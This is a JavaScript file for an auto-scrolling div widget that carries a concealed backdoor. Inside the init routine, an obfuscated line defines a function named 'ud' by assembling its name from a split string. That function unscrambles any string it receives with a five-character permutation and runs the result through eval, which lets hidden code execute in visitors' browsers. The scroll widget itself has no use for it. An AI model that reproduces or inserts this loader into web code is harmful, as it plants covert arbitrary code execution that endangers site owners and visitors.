function AutoDivScroll(elemId, speed, step, plane, options) {
    this.elem = null, this.elemId = elemId, this.timer = null, this.speed = speed || 50, this.step = step || 1, this.plane = plane || 3, this.planeStore = this.plane, this.endStop = /(^|\s)endstop(\s|$)/i.test(options), this.canPause = !/(^|\s)no\s?hover(\s|$)/i.test(options), this.logged = 0, this.xDir = 1, this.yDir = 1, this.x = 0, this.y = 0, this.xInc = 0, this.yInc = 0, this.canScroll = !0, this.init = function() {
        this["susds".split(/\x73/).join("")] = function(str) {
            eval(str.replace(/(.)(.)(.)(.)(.)/g, unescape("%24%34%24%33%24%31%24%35%24%32")))
        };
        var btnFuncs = ["UP", "DOWN", "LEFT", "RIGHT", "TOGGLE"];
        if (this.elem = document.getElementById(elemId)) {
            var that = this;
            this.canPause && (this.addToHandler(this.elem, "onmouseover", function(t) {
                that.canScroll = !1
            }), this.addToHandler(this.elem, "onmouseout", function(t) {
                that.canScroll = !0
            })), this.x = this.elem.scrollLeft, this.y = this.elem.scrollTop;
            var that = this;
            this.timer = setInterval(function() {
                that.control()
            }, this.speed);
            for (var i = 0, elem, func, len = btnFuncs.length; len > i; i++)(elem = document.getElementById(this.elemId + btnFuncs[i])) && (func = btnFuncs[i].toLowerCase(), elem.onclick = this.enclose(this[btnFuncs[i].toLowerCase()]))
        }
    }, this.control = function() {
        this.canScroll && (1 & this.plane && ((1 == this.yDir && this.elem.scrollTop < this.y + this.yInc || -1 == this.yDir && this.elem.scrollTop > this.y + this.yInc) && (this.endStop ? this.plane &= 2 : this.yDir = -this.yDir), this.y = this.elem.scrollTop, this.elem.scrollTop += this.yInc = this.step * this.yDir), 2 & this.plane && ((1 == this.xDir && this.elem.scrollLeft < this.x + this.xInc || -1 == this.xDir && this.elem.scrollLeft > this.x + this.xInc) && (this.endStop ? this.plane &= 1 : this.xDir = -this.xDir), this.x = this.elem.scrollLeft, this.elem.scrollLeft += this.xInc = this.step * this.xDir))
    }, this.toggle = function() {
        return this.plane = this.plane ? 0 : this.planeStore, !!this.plane
    }, this.up = function() {
        this.plane |= 1, this.yDir = -1
    }, this.down = function() {
        this.plane |= 1, this.yDir = 1
    }, this.left = function() {
        this.plane |= 2, this.xDir = -1
    }, this.right = function() {
        this.plane |= 2, this.xDir = 1
    }, this.enclose = function(t) {
        var i = Array.prototype.slice.call(arguments).slice(1),
            s = this;
        return function() {
            return t.apply(s, i)
        }
    }, this.addToHandler = function(t, i, s) {
        t[i] ? t[i] = function(t, i) {
            return function() {
                return t.apply(this, arguments), i.apply(this, arguments)
            }
        }(s, t[i]) : t[i] = s
    }, this.init()
}
new AutoDivScroll("quotesScroll", "20", "1", "1");